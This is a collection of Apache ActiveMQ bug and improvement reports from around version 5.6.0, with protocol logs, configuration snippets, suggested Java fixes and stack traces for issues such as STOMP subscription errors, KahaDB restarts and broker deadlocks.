ActiveMQ does not respect read ACK over STOMP connections.Protocol logs follow:dmichellis@ni-73291-3:~/scripts/activemq$ telnet kolombo-s-pla1 61614Trying 192.168.128.130...Connected to kolombo-s-pla1.Escape character is "^]".CONNECT^@CONNECTEDheart-beat:0,0session:ID:kolombo-s-pla1.adm.intranet-34333-1336745977026-2:9server:ActiveMQ/5.6.0version:1.0SUBSCRIBEack:clientdestination:nagios-eventsactivemq.prefetchSize:1^@MESSAGEmessage-id:ID:kolombo-s-pla1.adm.intranet-34333-1336745977026-2:10:-1:1:1destination:/queue/nagios-eventstimestamp:1336746413131expires:0persistent:truepriority:4msg 18712 0MESSAGEmessage-id:ID:kolombo-s-pla1.adm.intranet-34333-1336745977026-2:10:-1:1:2destination:/queue/nagios-eventstimestamp:1336746413152expires:0persistent:truepriority:4msg 18712 1MESSAGEmessage-id:ID:kolombo-s-pla1.adm.intranet-34333-1336745977026-2:10:-1:1:3destination:/queue/nagios-eventstimestamp:1336746413161expires:0persistent:truepriority:4msg 18712 2MESSAGEmessage-id:ID:kolombo-s-pla1.adm.intranet-34333-1336745977026-2:10:-1:1:4destination:/queue/nagios-eventstimestamp:1336746413163expires:0persistent:truepriority:4msg 18712 3MESSAGEmessage-id:ID:kolombo-s-pla1.adm.intranet-34333-1336745977026-2:10:-1:1:5destination:/queue/nagios-eventstimestamp:1336746413165expires:0persistent:truepriority:4msg 18712 4
issueID:AMQ-3836
type:Bug
changed files:LegacyFrameTranslator.java
texts:STOMP 1.0 protocol (SUBSCRIBE destination) broken on ActiveMQ 5.6.0
Destination specification on STOMP using activemq 5.6.0 is broken.Before 5.6.0, you had to specify "/queue/my_queue". Now, activemq automatically includes a "/queue/" on destination name, whether needed or not.For instance, sending messages to "/queue/nagios-events" works. Subscribing to "/queue/nagios-events" creates an additional queue named "/queue/queue/nagios-events".Message sending is also affected, although it accepts both "/queue/nagios-events" and "nagios-events"
issueID:AMQ-3841
type:Bug
changed files:
texts:mKahaDB causes ArrayIndexOutOfBoundsException on restart after deleting existing queues
To replicate, use these settings in the activemq.xml  <persistenceAdapter>   <mKahaDB directory="${activemq.data}/kahadb">    <filteredPersistenceAdapters>     <filteredKahaDB perDestination="true" >      <persistenceAdapter>       <kahaDB journalMaxFileLength="32mb" />      </persistenceAdapter>     </filteredKahaDB>    </filteredPersistenceAdapters>   </mKahaDB>  </persistenceAdapter> Start the broker Create a queue   This will create the queue in the /kahadb folder   Delete the queue   The queue is not deleted from the /kahadb folder   Stop the broker Start the brokerThis will cause cause the stack trace that is attached.To fix this, delete the queue in the /kahadb folder and start the broker.  This allows the broker to start as normal.
issueID:AMQ-3842
type:Bug
changed files:
texts:test units should run discovery mechanism via loopback device
Many test units are failing on boxes with NAT firewalls enabled, although discovery via loopback device would (IMHO) be sufficient for test units.My NAT setup allows all traffic via lo, but only related traffic via eth0 etc., which should be the regular fw security setup on most or many end-user boxes.The test org.apache.activemq.transport.discovery.DiscoveryTransportNoBrokerTest (for example) makes activemq send out discovery messages via eth0, which is probably not a perfect solution if one wants to have portable test units (and also produces spam packets on the local network during testing
issueID:AMQ-3845
type:Bug
changed files:
texts:CachedLDAPAuthorizationMap doesn&#39;t handle the ldap connectino dying
If the ldap connection dies for some reason (ldap server restarting etc.), the broker will continue to attempt to use the old connection for authorization, resulting in all attempts to use the broker being denied.In CachedLDAPAuthorizationMap.java, the open() function just returns the context if one exists. Instead, it should check to see if the context is still valid, and if not create one.Alternatively, the caching of the ldap connection can be removed entirely, and then in the refreshInterval>0 case, a new ldap connection will be made each refresh interval (default setting: every 5 minutes).i.e. delete these lines:        if (context != null) {            return context;        }
issueID:AMQ-3846
type:Bug
changed files:
texts:The JMX message move, copy and remove operation do not take messages in FIFO order
When a page is pulled in, it is placed in a LinkedHashMap which preserves the queue order, but the below code then pulls the values from the LinkedHashMap and puts them in a Set.  This causes the FIFO order of the queue to be lost.  If the number of max messages to move is smaller the the page size, then the outcome looks like random messages from the queue being moved (copied or removed)....Set<MessageReference> set = new HashSet<MessageReference>();       ConnectionContext context = createConnectionContext();       do {           doPageIn(true);           pagedInMessagesLock.readLock().lock();           try{               set.addAll(pagedInMessages.values());           }finally {               pagedInMessagesLock.readLock().unlock();           }...Can this be changed to preserve the queue order?
issueID:AMQ-3847
type:Improvement
changed files:
texts:Optional import for org.apache.activemq.pool in activemq-camel should be required
Ref AMQ-2502Since activemq-camel really requires pools this should be marked required.
issueID:AMQ-3849
type:Bug
changed files:MultiKahaDBPersistenceAdapter.java
TransactionIdConversion.java
journal-data.proto
KahaDBPersistenceAdapter.java
texts:Typos in protobuf specs + generated Java code for KahaDB
activemq-core/src/main/proto/journal-data.proto contains several typos in the word "transaction", spelled as "transaciton". These typos also propagate to the Java code and the API, as a result of protobuf compilation.Will submit a fix in the next hours.
issueID:AMQ-3851
type:Bug
changed files:
texts:Infinite TemqQueue advisory messages
I"m seeing a behavior that looks like a race condition of some kind. I have two brokers (MSSD5D101, MSTMIP103). MSSD5D101 has a duplex network connector connecting it to MSTMIP103. The two machines are in different US states so there is a VPN in between. I have two consumer services that reply to queued messages. One consumer (WISD5P101) connects to MSSD5D101 and the other consumer (POSD5P101) connects to MSTMIP103. I also have a web portal that sends messages out to different queues expecting a response. The web portal, and two consumers are all .NET based. What is happening is that after some number of messages, something goes crazy and floods the network of brokers with advisory messages pertaining to temp queues being added or removed. By restarting one or the other of the ActiveMQ servers, things return to normal. But, while the flood is happening, one of the machines will be at 100% CPU and become worthless. I will be attaching logs and some code that I"m using to interact with ActiveMQ.
issueID:AMQ-3852
type:Bug
changed files:
texts:Stomp transport allows durable topic subscriber to subscribe to a queue
See also AMQ-2879 the stack-trace to which recently re-emerged in our production logs. The issue was traced to a developer having copy-pasted some PHP script that created a durable topic subscriber but in his clone he subscribed to a queue not a topic. He wasn"t to know...Question is how to prevent clients getting into this situation. Can the transport disconnect the client and log an error to the console, or must it allow the connection, potentially lulling the client developer into a false sense of functioning code?Might also want to review the documentation and potentially the header names to prevent future confusion.
issueID:AMQ-3853
type:Bug
changed files:
texts:Missing import in activemq-web-console
Running activemq-web-console in Karaf generates these errors:Caused by: java.lang.ClassNotFoundException: javax.servlet.ServletContextListener not found by org.apache.activemq.activemq-web-console &#91;118&#93;Caused by: java.lang.ClassNotFoundException: javax.servlet.Filter not found by org.apache.activemq.activemq-web-console &#91;118&#93;Caused by: java.lang.ClassNotFoundException: javax.servlet.http.HttpServlet not found by org.apache.activemq.activemq-web-console &#91;118&#93;It looks like activemq-web-console imports the following servlet packages:        javax.servlet.jsp;version="[2.1,3)", javax.servlet.jsp.el;version="[2.1,3)", javax.servlet.jsp.tagext;version="[2.1,3)",So it seems to be missing imports for:javax.servletjavax.servlet.http
issueID:AMQ-3854
type:Bug
changed files:
texts:Referencing old spring xsd in configuration files
Just noticed that we still reference http://www.springframework.org/schema/beans/spring-beans-2.0.xsdin config files although we upgraded to 3.x
issueID:AMQ-3855
type:Bug
changed files:
texts:MQTT doesn&#39;t translate wildcards to ActiveMQ wildcards
Currently, subscribing to ActiveMQ JMS messages over MQTT won"t work if you do foo/+ you would expect to receive a JMS or STOMP message sent to foo.bar.
issueID:AMQ-3856
type:Bug
changed files:
texts:MessageServlet assumes TextMessages contain Text
writeMessageResponse assumes that a text message will contain non null text.  It does a txt.startsWith which crashes with TextMessages with no body.It can be fixed with this code:    protected void writeMessageResponse(PrintWriter writer, Message message) throws JMSException, IOException {        if (message instanceof TextMessage) {            TextMessage textMsg = (TextMessage)message;            String txt = textMsg.getText();            if (txt != null) {                if (txt.startsWith("<?")) {                    txt = txt.substring(txt.indexOf("?>") + 2);                }                writer.print(txt);            }        } else if (message instanceof ObjectMessage) {            ObjectMessage objectMsg = (ObjectMessage)message;            Object object = objectMsg.getObject();            writer.print(object.toString());        }    }
issueID:AMQ-3857
type:Bug
changed files:
texts:MessageServlet get messages does not return JMS Message Properties
When using GET to get a message it does not return any of the JMS message properties.I can easily see how to add that code, but I"m not sure what the correct way to return them is.  They could go into the response headers via setResponseHeaders or the returned XML format could be changed to support properties and the header.  Sadly this would likely break most existing clients.  We"d like to use the REST API to enable some web clients to fully participate in a messaging system that is primarily Java based.  If we can come to agreement on how we want to return properties then I"d be happy to code up a patch.
issueID:AMQ-3858
type:Bug
changed files:AbstractJmxCommand.java
texts:Failure to resolve local jmx url for sunJvm can result in npe
calls to ./bin/activemq restart can result in this NPE which is ugly. It should fallback to the default jmxurl in this case.Connecting to pid: 47706ERROR: java.lang.NullPointerExceptionjava.lang.NullPointerExceptionat javax.management.remote.JMXServiceURL.<init>(JMXServiceURL.java:122)at org.apache.activemq.console.command.AbstractJmxCommand.handleOption(AbstractJmxCommand.java:350)at org.apache.activemq.console.command.ShutdownCommand.handleOption(ShutdownCommand.java:156)at org.apache.activemq.console.command.AbstractCommand.parseOptions(AbstractCommand.java:73)at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:45)at org.apache.activemq.console.command.AbstractJmxCommand.execute(AbstractJmxCommand.java:380)at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:148)at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:90)at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)at java.lang.reflect.Method.invoke(Method.java:597)at org.apache.activemq.console.Main.runTaskClass(Main.java:257)at org.apache.activemq.console.Main.main(Main.java:111)
issueID:AMQ-3859
type:Improvement
changed files:
texts:To tight version range in activemq features file
See the feature filehttps://issues.apache.org/jira/browse/KARAF-1497?focusedCommentId=13282170#comment-13282170Notice that the activemq-camel feature is hardcoded to 2.9.2 version of Camel<feature name="activemq-camel" version="5.6.0" resolver="(obr)"><feature version="5.6.0">activemq</feature><feature version="2.9.2">camel-jms</feature><bundle>mvn:org.apache.activemq/activemq-camel/5.6.0</bundle></feature>That should be a version range IMHO. But I can"t remember if Karaf supports this. But basically it should be something alike, if supported by Karaf:<feature version="[2.9,3)">camel-jms</feature>
issueID:AMQ-3861
type:Improvement
changed files:
texts:Offer a way to not set a transaction manager in activemq-camel
See CAMEL-5055 for the details.
issueID:AMQ-3863
type:Bug
changed files:
texts:XA session is returned twice to the pool
Once on afterCompletion() and once on regular close() this leads to pool exhaustion.
issueID:AMQ-3865
type:Bug
changed files:
texts:AjaxTest fails all tests due to line ending differences
The tests do index of comparison of "foo
" where on windows you"d need to do "foo
".  I don"t think the line endings are really significant to test.  If they are then I can change the test over to check the operating system and add carriage returns if necessary.
issueID:AMQ-3867
type:Bug
changed files:
texts:Unable to delete messages whose original destination is virtual topic from web console
When delete messages  whose original destination is virtual topic, you will find that the name of destination is still original virtual topic name, not the actual queue name, this cause broker unable to find the actual queue so no messages can be deleted successfully.
issueID:AMQ-3871
type:Bug
changed files:
texts:Problem in OrderPendingList can lead to message not being deliver after durable sub reconnect.
the addMessageFirst method in OrderPendingList can lead to corruption of the linked list causing iterators to not traverse all the pending messages in the non-persistent message list when a durable sub reconnects and keepDurableSubsActive is enabled (default value).
issueID:AMQ-3872
type:Bug
changed files:BlobJDBCAdapter.java
texts:Implement "exactly once" delivery with JDBC and XA in the event of a failure post prepare
JDBC store does not honor the prepare phase so a broker failure after prepare always results in a rollback which is in violation of the contract.In the cases where XA is required, the store needs to do its best to respect a prepare outcome.Having the TM use last resource commit one phase (or the one phase commit optimisation) avoids this issue but is not always possible.
issueID:AMQ-3873
type:Bug
changed files:
texts:Occasional deadlock during startup
During startup I occasionally get deadlocks. I never had those on earlier versions including a 5.6-SNAPSHOT from January.My activemq.xml contains a number of beans which each autowire the BrokerService and make connections to brokerService.getVmConnectorURI().toString()+"?async=false"To avoid beans to be started faster than the broker and create a second broker by trying to connect, the broker is instantiated with start=false and a special bean listening for the Spring ContextRefreshedEvent will start the broker and run each beans connection methods.Therefore a number of VmConnections will be done serially but in a rapid succession.This fails at different points, but always with the following thread lock analysis:Found one Java-level deadlock:============================="ActiveMQ Task-3":  waiting for ownable synchronizer 0x9f288120, (a java.util.concurrent.locks.ReentrantLock$NonfairSync),  which is held by "BrokerService[smcufs02] Task-1""BrokerService[smcufs02] Task-1":  waiting to lock monitor 0x0807a650 (object 0x9f2880d8, a java.util.concurrent.atomic.AtomicBoolean),  which is held by "ActiveMQ Task-3"Java stack information for the threads listed above:==================================================="ActiveMQ Task-3":        at sun.misc.Unsafe.park(Native Method)        - parking to wait for  <0x9f288120> (a java.util.concurrent.locks.ReentrantLock$NonfairSync)        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158)        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:747)        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:778)        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1114)        at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)        at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262)        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:66)        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1307)        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:837)        at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:798)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:152)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)        at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:135)        at org.apache.activemq.transport.vm.VMTransport.start(VMTransport.java:156)        - locked <0x9f2880d8> (a java.util.concurrent.atomic.AtomicBoolean)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.broker.TransportConnection.start(TransportConnection.java:914)        - locked <0x9f2e4f98> (a org.apache.activemq.broker.TransportConnection)        at org.apache.activemq.broker.TransportConnector$1$1.run(TransportConnector.java:227)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)        at java.lang.Thread.run(Thread.java:619)"BrokerService[smcufs02] Task-1":        at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:114)        - waiting to lock <0x9f2880d8> (a java.util.concurrent.atomic.AtomicBoolean)        at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:103)        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1307)        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:837)        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:872)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)        at java.lang.Thread.run(Thread.java:619)Found 1 deadlock.
issueID:AMQ-3877
type:Improvement
changed files:
texts:Add ability to set a timeout for the calls made to Broker MBeans
Add an options to the broker that allows for configuration of a timeout value that will be applied to calls made to the various broker MBean"s.  This allows for a way to terminate calls that hang or take to long for the users application.  By default there should be no timeout, users will configure this through the BrokerService.
issueID:AMQ-3878
type:Improvement
changed files:
texts:Reset stats automatically without dependancy on JMX / Java APIs
It would be a nice enhancement to allow a jms message header or destination indicate a request for reset of statistics so that the jms api via the statistics plugin could do it. This would allow c++ clients also be able to do this.
issueID:AMQ-3879
type:Bug
changed files:
texts:Temporary queues may be deleted by the wrong connection
While trying to upgrade CXF from 5.4.2 to 5.6, I ran into a slight problem.  The fix for AMQ-3038 seems to have caused an issue where closing a connection that has been given an advisory of a temporary queue (AdvisoryConsumer) will result in the temporary queue being delete even if the connection that NEEDS the queue is still using it.Chatted with gtully a bit:http://irclogs.dankulp.com/logs/irclogger_log/activemq?date=2012-06-12,Tue&sel=112#l108This can be reproduced with a CXF checkout (2.6.x-fixes branch) by updating parent/pom.xml to use activemq 5.6 and running the test in rt/transport/jms.   The MessageIdAsCorrelationIdJMSConduitTest  test fails.A workaround is to use a PooledConnectionFactory instead of the ActiveMQConnectionFactory.   I"ll be committing that workaround to trunk so the problem will not be re-producible there.
issueID:AMQ-3880
type:New Feature
changed files:SecureSocketConnectorFactory.java
Krb5AndCertsSslSocketConnector.java
HttpsTransportServer.java
SocketConnectorFactory.java
HttpTransportServer.java
texts:WSS transport
Feature request: wss transport for secure websocket connectionsCannot bind to the not secure websocket from https pages. Got JS security exception.
issueID:AMQ-3881
type:Bug
changed files:
texts:Handy diagnostic script for troubleshooting ActiveMQ problems
useful script contributed by a user that pulls together os diagnostic utility output into a single archive. Useful for remote troubleshooting.
issueID:AMQ-3882
type:Bug
changed files:AdvisoryBroker.java
texts:Broker should not send advisories for slow consumers or fast producers if the destination in question is an advisory destination already.
The code in the AdvisoryBroker class that sends out the advisory for slow consumer and fast producer doesn"t check the destination of those producers and consumers to see if they themselves are advisory destinations.  This could lead to some undesirable side effects based on how those advisories are being handled.
issueID:AMQ-3883
type:Improvement
changed files:AuthorizationEntry.java
SimpleCachedLDAPAuthorizationMap.java
DefaultAuthorizationMap.java
texts:activemq-jaas authorization doesn&#39;t work with Karaf JAAS LoginModule
currently activemq-jaas can"t work with karaf loginModule, the reason comes from the compare betweenamq GroupPrincipal and karaf UserPrincipal/RolePrincipal doesn"t workMore details please see&#91;1&#93;.We have a similar issue in Servicemix NMR&#91;2&#93; and the fix can honor the compare betweenamq GroupPrincipal and karaf UserPrincipal/RolePrincipal yet not introduce any dependency between activemq-jaas and karaf jaas.&#91;1&#93;http://karaf.922171.n3.nabble.com/Karaf-ActiveMQ-authorization-problem-td4024834.html&#91;2&#93;https://issues.apache.org/jira/browse/SMX4NMR-283
issueID:AMQ-3885
type:Bug
changed files:ActiveMQConnectionFactory.java
TaskRunnerFactory.java
ActiveMQConnection.java
texts:ActiveMQ java client doesn&#39;t scale to thousands of queues
The ActiveMQ broker scales to tens of thousands of queues easily when using -Dorg.apache.activemq.UseDedicatedTaskRunner=false (false by default).A problem actually arises in the java client side, when a client is listening to X queues using 1 connection and Y sessions per queue, using a JMS message listener, X * Y threads will be created, when X * Y is not bounded,This is because each ActiveMQConnection object holds a TaskRunnerFactory which in turn has a ThreadPoolExecutor, the max pool size of the executor is defined to be Integer.MAX_VALUE, with the combination of a SynchronousQueue it creates as many threads as it pleases.the behavior of the executor is dependent on min pool size, core pool size, queue impl and rejection policy a few options to handle this :1. the default rejection policy throws an exception which is not handled,ThreadPoolExecutor.CallerRunsPolicy sounds better then the default2. Change the queue impl to LinkedBlockingQueue and change the core pool size to a bounded value3. Provide the means to supply an external executor to be shared in the app
issueID:AMQ-3887
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:Occasional Null Pointer Exception during NetworkConnector connection
While starting a duplex NetworkConnector an NPE can be observed on the receiving side.2012-06-18 17:34:24,571 INFO  .DemandForwardingBridgeSupport - Network connection between vm://proxy-cbpi001#8 and tcp:///169.254.0.5:59412(cbox-56BU101117) has been established. [StartLocalBridge: localBroker=vm://proxy-cbpi001#8]2012-06-18 17:34:24,577 WARN  .DemandForwardingBridgeSupport - Caught an exception processing local command [BrokerService[proxy-cbpi001] Task-19]java.lang.NullPointerException: null        at org.apache.activemq.network.DemandForwardingBridgeSupport.configureMessage(DemandForwardingBridgeSupport.java:644) ~[activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:675) ~[activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.network.DemandForwardingBridgeSupport$1.onCommand(DemandForwardingBridgeSupport.java:139) [activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) [activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) [activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:135) [activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:124) [activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:103) [activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68) [activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) [activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1307) [activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:837) [activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:872) [activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) [activemq-core-5.6.0.jar:5.6.0]        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) [activemq-core-5.6.0.jar:5.6.0]        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source) [na:1.6.0_20]        at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) [na:1.6.0_20]        at java.lang.Thread.run(Unknown Source) [na:1.6.0_20]The other broker will eventually connect, but with about a hundred of connecting brokers this occurs too often to ignore.As this seems to be a race condition it is quite difficult to reproduce reliably. I assume producerInfo is accessed in configureMessage before it is initialized in startRemoteBridge.
issueID:AMQ-3889
type:Bug
changed files:
texts:Body Preview of BytesMessages change when browsed multiple times from QueueViewMbean
When using the browse method of org.apache.activemq.broker.jmx.QueueViewMBean to obtain CompositeData of messages, the Body Preview of BytesMessages changes between each browse.I am not sure if that is intended behaviour, but I have written a testcase that illustrates it. I have also narrowed it down to org.apache.activemq.broker.jmx.OpenTypeSupport.BytesMessageOpenTypeFactory, which uses ActiveMQBytesMessage.readBytes but does not call reset afterwards.
issueID:AMQ-3890
type:Improvement
changed files:
texts:Turn dependency on fusemq-leveldb optional
This is the dependency tree of activemq-core artifact:Does it really need to depend on FuseSource related artifacts? Can"t let them be optional?Or maybe, create an activemq-leveldb artifact for that implementation.+- org.apache.activemq:activemq-camel:jar:5.6.0:compile&#91;INFO&#93; |  +- org.apache.camel:camel-jms:jar:2.9.2:compile&#91;INFO&#93; |  |  &#45; org.apache.camel:camel-spring:jar:2.9.2:compile&#91;INFO&#93; |  &#45; org.apache.activemq:activemq-core:jar:5.6.0:compile&#91;INFO&#93; |     +- org.apache.activemq:kahadb:jar:5.6.0:compile&#91;INFO&#93; |     +- org.apache.activemq.protobuf:activemq-protobuf:jar:1.1:compile&#91;INFO&#93; |     +- org.fusesource.fuse-extra:fusemq-leveldb:jar:1.1:compile&#91;INFO&#93; |     |  +- org.fusesource.hawtbuf:hawtbuf-proto:jar:1.9:compile&#91;INFO&#93; |     |  +- org.fusesource.hawtdispatch:hawtdispatch-scala:jar:1.9:compile&#91;INFO&#93; |     |  |  &#45; org.fusesource.hawtdispatch:hawtdispatch:jar:1.9:compile&#91;INFO&#93; |     |  +- org.iq80.leveldb:leveldb:jar:0.2:compile&#91;INFO&#93; |     |  |  +- org.iq80.leveldb:leveldb-api:jar:0.2:compile&#91;INFO&#93; |     |  |  +- com.google.inject:guice:jar:3.0:compile&#91;INFO&#93; |     |  |  +- com.google.inject.extensions:guice-multibindings:jar:3.0:compile&#91;INFO&#93; |     |  |  &#45; com.google.guava:guava:jar:10.0.1:compile&#91;INFO&#93; |     |  +- org.fusesource.leveldbjni:leveldbjni-osx:jar:1.2:compile&#91;INFO&#93; |     |  |  &#45; org.fusesource.leveldbjni:leveldbjni:jar:1.2:compile&#91;INFO&#93; |     |  |     &#45; org.fusesource.hawtjni:hawtjni-runtime:jar:1.5:compile&#91;INFO&#93; |     |  +- org.fusesource.leveldbjni:leveldbjni-linux32:jar:1.2:compile&#91;INFO&#93; |     |  +- org.fusesource.leveldbjni:leveldbjni-linux64:jar:1.2:compile&#91;INFO&#93; |     |  +- org.xerial.snappy:snappy-java:jar:1.0.3:compile&#91;INFO&#93; |     |  +- org.codehaus.jackson:jackson-core-asl:jar:1.9.2:compile&#91;INFO&#93; |     |  +- org.codehaus.jackson:jackson-mapper-asl:jar:1.9.2:compile&#91;INFO&#93; |     |  +- org.apache.hadoop:hadoop-core:jar:1.0.0:compile&#91;INFO&#93; |     |  |  &#45; commons-configuration:commons-configuration:jar:1.6:compile&#91;INFO&#93; |     |  |     +- commons-collections:commons-collections:jar:3.2.1:compile&#91;INFO&#93; |     |  |     +- commons-digester:commons-digester:jar:1.8:compile&#91;INFO&#93; |     |  |     &#45; commons-beanutils:commons-beanutils-core:jar:1.8.0:compile&#91;INFO&#93; |     |  &#45; org.scala-lang:scala-library:jar:2.9.1:compile&#91;INFO&#93; |     +- org.fusesource.mqtt-client:mqtt-client:jar:1.0:compile&#91;INFO&#93; |     |  +- org.fusesource.hawtdispatch:hawtdispatch-transport:jar:1.9:compile&#91;INFO&#93; |     |  &#45; org.fusesource.hawtbuf:hawtbuf:jar:1.9:compile&#91;INFO&#93; |     +- org.osgi:org.osgi.core:jar:4.1.0:compile&#91;INFO&#93; |     +- commons-net:commons-net:jar:2.2:compile&#91;INFO&#93; |     &#45; org.jasypt:jasypt:jar:1.8:compile
issueID:AMQ-3893
type:Improvement
changed files:
texts:Adjust topic policy entry in default configuration
With https://issues.apache.org/jira/browse/AMQ-2400 we introduced vmCursor and memory limit for all topics by default. While this improved throughput in high-volume topic scenarios it can cause a single slow consumer block the producer and affect all other producers.The proposition is to use pendingMessageLimitStrategy by default and limit the number of messages we"re retaining by default for consumer as a strategy for dealing with slow consumers (instead of blocking)We also need to add more documentation explaining all aspects of these settings and their consequences.
issueID:AMQ-3894
type:New Feature
changed files:FilteredKahaDBPersistenceAdapter.java
AuthorizationEntry.java
texts:Add support for Broker based redelivery
redelivery is handled by the consumer, so client side. messages pending redelivery are seen as inflight by the broker and not available to other consumers. It is possible to break the order constraint and receive messages backed up behind a message pending redelivery, but this is all local to the client consumer.When redelivery is exhausted, the message is returned to the broker with a poison ack, which the broker responds by removing the message and doing Dead letter queue processing (DLQ).This enhancement will allow a replacement of DLQ handling that will handle redelivery. It is based on the ideas outlined and implemented by a camel route in https://issues.apache.org/jira/browse/AMQ-2710 The idea is a BrokerPlugin will override sendToDeadLetterQueue and resend the message to the original destination in accordance with a matching RedeliveryPolicy. The resend will use the broker schedular to implement the delayed send after the message has been acked as poison by the consumer.So the message will essentially be enqueued at the tail of the queue and dispatched again to any available consumer.If retries are exceeded or there is no matching redelivery policy for a destination, normal DLQ processing will take place.This will work in conjunction with consumer/client redelivery exhaustion or using a redelivery policy in the url query of jms.redeliveryPolicy.maximumRedeliveries=0
issueID:AMQ-3895
type:Bug
changed files:
texts:Broker sends a STOMP RECEIPT frame although the subscription fails
When using STOMP to subscribe to ActiveMQ using a receipt and an invalid selector or the client is not authorized, the broker replies with a RECEIPT frame giving the impression that the subscription did succeed.Since the subscription fails, a RECEIPT frame should not be sent but instead an ERROR from with the matching receipt-id value should be returned to the client.This was introduced in v5.6.0 as a fix for message dispatch sometimes beating the RECEIPT command back to the client.
issueID:AMQ-3896
type:Bug
changed files:
texts:AMQ3622Test throws NumberFormatException on ec2/ubuntu 10.04
This test throws a NumberFormatException when run on a Ubuntu 10.04 node on Amazon EC2. The test tries to get the connectionUri port by calling Integer.parseInt(connectionUri.replace("stomp://localhost:", "")).  However, when run on ec2 the connectionUri actually looks something like this "stomp://localhost.localdomain:38542", so the replace doesn"t work as intended.
issueID:AMQ-3897
type:Bug
changed files:
texts:Stomp 1.1 keep alive does not work with stomp+nio
using the transport:  <transportConnector name="stomp+nio" uri="stomp+nio://0.0.0.0:6163"/>When connecting a stomp 1.1 client I see this using tcpdump (tcpdump output so new lines etc):send...>CONNECT.passcode:xxx.host:kvm4.content-length:0.heart-beat:30000,30000.content-type:text/plain; charset=UTF-8.login:rip.accept-version:1.1,1.0...<...receiveCONNECTED.heart-beat:0,0.session:ID:kvm4-55239-1340217683781-3:10008.server:ActiveMQ/5.6.0.version:1.1....Notice that I send the heart-beat header requesting 30000,30000 heartbeats but then ActiveMQ replies with 0,0If I change the stomp transport to stomp and not stomp+nio and not changing my code or what I send in CONNECT request I get the correct heartbeats.It seems stomp+nio does not have heartbeat support for protocol 1.1
issueID:AMQ-3900
type:Test
changed files:
texts:Thread.sleep call in TopicProducerFlowControlTest sleeps too long on Ubuntu, causing test timeout
The onMessage() method of this test calls Thread.sleep(1) on every call.  On Ubuntu 10.04 this actually sleeps for an average of 10 milliseconds, which causes the test to timeout.I"ve added a patch which has onMessage() sleep for 100 millisecond on every 100 iterations instead.
issueID:AMQ-3903
type:Bug
changed files:
